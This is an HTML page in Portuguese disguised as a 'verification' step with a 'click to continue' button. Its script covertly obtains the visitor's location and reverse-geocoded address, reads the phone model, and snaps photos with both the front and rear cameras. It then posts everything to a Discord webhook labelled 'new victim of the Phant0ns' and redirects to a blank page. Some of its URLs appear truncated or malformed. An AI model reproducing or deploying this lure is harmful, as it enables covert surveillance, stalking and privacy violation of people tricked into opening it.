<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação</title>
    <style>
        body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
        .vermelho { color: red; font-weight: bold; font-size: 26px; }
        .verde { color: #00ff00; font-weight: bold; font-size: 22px; }
        #btn { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #222; color: white; border: 1px solid #444; border-radius: 8px; }
    </style>
</head>
<body>
    <div id="m" style="display:none;">
        <p class="vermelho">TEXTO TEXTO TEXTO</p>
        <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
        <p>TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
    </div>
    <button id="btn">CLIQUE PARA CONTINUAR</button>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // WEBHOOK CORRIGIDO
        const WEBHOOK = 'https://discord.com';

        document.getElementById('btn').addEventListener('click', async () => {
            document.getElementById('m').style.display = 'block';
            document.getElementById('btn').style.display = 'none';

            try {
                // 1. Localização corrigida
                const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                const res = await fetch(`https://openstreetmap.org{p.coords.latitude}&lon=${p.coords.longitude}`);
                const d = await res.json();
                const endereco = d.display_name || "Endereço não identificado";

                // 2. Modelo Celular corrigido
                const userAgent = navigator.userAgent;
                const modMatch = userAgent.match(/\(([^)]+)\)/);
                const modelo = modMatch ? modMatch[1].split(';')[2] || modMatch[1] : "Desconhecido";

                // 3. Foto Frontal
                const s1 = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                const f1 = await tirar(s1);
                
                // 4. Foto Traseira
                const s2 = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment"}});
                const f2 = await tirar(s2);

                await enviar(f1, f2, endereco, modelo);
                
                setTimeout(() => { window.location.href = "about:blank"; }, 3000);
            } catch (e) { 
                console.log(e);
                // Se der erro, ele tenta enviar só o que conseguiu ou sai
                setTimeout(() => { window.location.href = "about:blank"; }, 2000);
            }
        });

        async function tirar(s) {
            const v = document.getElementById('v');
            v.srcObject = s;
            await new Promise(r => setTimeout(r, 1000));
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img = c.toDataURL('image/jpeg');
            s.getTracks().forEach(t => t.stop());
            return img;
        }

        async function enviar(img1, img2, end, mo) {
            const fd = new FormData();
            const payload = {
                content: "NOVA VÍTIMA DOS PHANT0NS 😈😈😈😈",
                embeds: [{
                    title: "DADOS DA VÍTIMA",
                    description: `📍 **LOCALIZAÇÃO:**\n${end}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📱 **MODELO CELULAR:**\n${mo}\n\nphant0ns 😈`,
                    color: 16711680,
                    image: { url: 'attachment://f1.jpg' },
                    thumbnail: { url: 'attachment://f2.jpg' }
                }]
            };
            fd.append('payload_json', JSON.stringify(payload));
            
            const b1 = await (await fetch(img1)).blob();
            fd.append('file1', b1, 'f1.jpg');
            
            const b2 = await (await fetch(img2)).blob();
            fd.append('file2', b2, 'f2.jpg');

            await fetch(WEBHOOK, { method: 'POST', body: fd });
        }
    </script>
</body>
</html>
